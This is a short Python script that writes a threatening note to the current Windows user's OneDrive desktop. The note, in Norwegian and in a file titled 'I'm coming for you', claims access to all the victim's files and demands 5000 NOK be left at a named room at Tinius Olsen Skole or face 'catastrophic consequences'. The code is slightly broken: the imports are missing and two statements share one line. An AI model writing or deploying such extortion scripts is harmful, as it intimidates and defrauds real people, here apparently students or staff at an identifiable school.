def get_desktop_path():
    username = os.getlogin()
    desktop_path = os.path.join("C:\\Users", username, "OneDrive - Viken fylkeskommune", "Desktop")
    return desktop_path
def create_and_write_text_file(text):
    desktop_path = get_desktop_path()
    file_path = os.path.join(desktop_path, 'jeg kommer for deg.txt')
    with open(file_path, 'w') as file:
        file.write(text)
    return file_path
text_to_write = "Tror du at du er trygg? Jeg har tilgang til alle filene dine, om du ikke legger igjen en pakke med 5000 NOK i et rødt skap markert med grønn teip ved rom T113 på Tinius Olsen Skole vil du få katastrofale konsekvenser..."
created_file_path = create_and_write_text_file(text_to_write)print("Sjekk Skrivebordet ditt..")
t.sleep(2)